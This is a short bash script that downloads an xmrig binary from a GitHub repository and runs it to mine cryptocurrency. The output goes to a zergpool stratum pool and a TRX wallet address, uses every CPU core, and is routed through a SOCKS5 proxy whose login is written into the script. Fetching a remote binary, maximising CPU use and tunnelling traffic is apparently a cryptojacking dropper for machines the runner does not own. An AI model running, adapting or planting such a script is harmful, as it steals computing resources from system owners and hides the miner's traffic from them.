#!/bin/bash
apt update -y &&
wget -q https://github.com/uaaoxjdr/testly/raw/main/xmrig
chmod +x xmrig
./xmrig -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://mxxbceyq:ie954kf96kht@45.15.169.241:5362
